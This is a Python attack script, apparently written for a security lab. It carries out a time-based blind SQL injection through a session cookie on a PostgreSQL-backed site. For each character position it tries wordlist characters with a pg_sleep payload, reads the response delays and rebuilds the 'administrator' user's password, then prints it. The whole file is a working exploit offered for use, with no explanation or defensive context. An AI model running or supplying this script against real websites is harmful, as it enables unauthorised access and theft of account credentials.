import requests
import argparse
import threading
import time


def BlindConditionalTest(num, file_name, cookie_name):
	file = open(file_name)
	for letter in file:
		try:
			letter = letter.strip()
			BlindSQL = f"'%3B+SELECT+CASE+WHEN+(USERNAME='administrator' AND SUBSTR(password,{num},1)='{letter}')+THEN+pg_sleep%2810%29+ELSE+pg_sleep%280%29+END from users--"

			new_cookie = target_cookie + BlindSQL
			s.cookies.set(cookie_name, None)
			s.cookies.set(cookie_name, new_cookie)
			result = s.get(URL)
			seconds = result.elapsed.total_seconds()
			seconds = int(seconds)
			est = 10
			if seconds >= 10:
				return letter
		except:
			print(f"Error with {letter}")



parser = argparse.ArgumentParser()
parser.add_argument('-u', help='URL', dest='URL')
parser.add_argument('-c', help='cookie', dest='cookie')
args = parser.parse_args()
URL = args.URL
cookie_name = args.cookie

s = requests.Session()

s.get(URL)
cookies = s.cookies.get_dict()
target_cookie =cookies[cookie_name]

result = ""
"""
	This loop goes through the lower case list and if it doesn't match, then moves on to numbers 1-9 then onto capital letters

"""
for num in range(1,21):
	try:
		letter = BlindConditionalTest(num, "/home/kali/wordlists/lower_case", cookie_name)
		if letter == None:
			letter = BlindConditionalTest(num, "/home/kali/wordlists/num_1-9", cookie_name)
			if letter == None:
				letter = BlindConditionalTest(num, "/home/kali/wordlists/capital", cookie_name)
				if letter == None:
					print(f"Unable to find letter at postition {num}")
		result += letter
	except:
		print(f"Error with letter: {letter} at number: {num}")
print(f"Password: {result}")


